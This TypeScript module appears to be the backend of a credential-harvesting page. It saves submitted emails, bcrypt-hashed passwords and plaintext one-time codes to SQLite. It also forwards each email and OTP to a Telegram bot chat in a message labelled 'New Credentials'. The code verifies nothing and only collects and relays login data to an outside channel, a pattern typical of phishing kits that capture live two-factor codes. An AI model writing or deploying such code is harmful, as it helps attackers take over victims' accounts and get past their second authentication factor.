import sqlite3 from "sqlite3";
import { open, Database } from "sqlite";
import axios, { AxiosResponse } from "axios";
import bcrypt from "bcrypt";


export interface User {
  id?: number;
  email: string;
  password: string;
  otp: string;
  created_at?: string;
}

export const initDB = async (): Promise<Database> => {
  const db = await open({
    filename: "./auth.db",
    driver: sqlite3.Database,
  });

  await db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      email TEXT UNIQUE NOT NULL,
      password TEXT NOT NULL,
      otp TEXT NOT NULL,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP
    );
  `);

  return db;
};




export const saveAndSendToTelegram = async (
  db: Database,
  email: string,
  password: string,
  otp: string
): Promise<void> => {
  const TELEGRAM_BOT_TOKEN: string | undefined = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID: string | undefined = process.env.TELEGRAM_CHAT_ID;
  if (!email || !password || !otp) {
    throw new Error("Invalid input data");
  }
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error("Telegram credentials missing");
  }

  // --- Hash Password ---
  const hashedPassword = await bcrypt.hash(password, 10);

  // --- Insert into DB ---
  await db.run("INSERT INTO users (email, password, otp) VALUES (?, ?, ?)", [
    email,
    hashedPassword,
    otp,
  ]);

  // --- Send to Telegram (without real password for security) ---
  const text = `🔐 New Credentials:\n\n📧 Email: ${email}\n🔑 Password: [HASHED]\n📲 OTP: ${otp}`;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  const response = await axios.post(url, {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: "Markdown",
  });

  if (!response.data.ok) {
    throw new Error(`Telegram API error: ${response.data.description}`);
  }
};
